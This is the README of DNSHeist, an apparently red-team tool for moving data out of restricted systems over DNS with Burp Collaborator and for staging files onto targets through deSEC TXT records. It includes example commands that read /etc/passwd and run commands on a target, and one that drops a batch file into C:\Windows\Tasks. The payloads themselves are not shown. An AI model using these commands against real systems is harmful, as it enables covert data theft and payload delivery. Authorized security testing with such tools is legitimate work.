# DNSHeist

DNS-based data exfiltration and file transfer for restricted systems. Uses Burp Collaborator for outbound data and deSEC for inbound file staging. No custom server needed.

Blog post: https://k4z0.sh/posts/dnsheist/

## Requirements

- Python 3
- Burp Suite (with Jython for the helper extension)
- deSEC account (free dynDNS domain) for file transfer to target

## Setup

1. Clone the repo.
2. Load `collab_helper.py` in Burp: Extensions → Add → select the Python file.
3. For file transfer to the target, create a free account and domain at https://desec.io and generate an API token.

## Exfiltration (Burp Collaborator)

Start the tool:

```
python3 main.py --from-burp
```

Interactive menu lets you choose command execution or file exfil, then the payload type (PowerShell, bash/nslookup, bash/ping, sh, etc.).

One-off examples:

```
python3 main.py --from-burp --cmd "uname -a" --platform 4
python3 main.py --from-burp --file "/etc/passwd" --platform 4
python3 main.py --from-burp --file "C:\\Windows\\System32\\drivers\\etc\\hosts" --platform 1
```

Copy the printed payload and run it on the target. The tool polls Collaborator, shows chunks as they arrive, and reconstructs the output or file when you press Enter.

## File transfer to target (deSEC)

Stage a file (compresses, splits into TXT records, uploads via deSEC API, includes MD5):

```
python3 main.py --desec-domain yourdomain.dedyn.io --desec-token YOUR_TOKEN --desec-stage /path/to/local/file --desec-dest C:\\Windows\\Tasks\\out.bat
```

It prints several native download payloads (PowerShell, bash+dig, bash+nslookup, sh, etc.). Run one on the target. The file is reconstructed, decompressed, and MD5-checked automatically.

Clean staged records afterwards:

```
python3 main.py --desec-domain yourdomain.dedyn.io --desec-token YOUR_TOKEN --desec-clean
```

## Disclaimer

This project is provided for **educational and authorized security testing purposes only**. The author is not responsible for any misuse of this tool or for any damage caused by its use. Only use DNSHeist on systems and environments you are authorized to test.
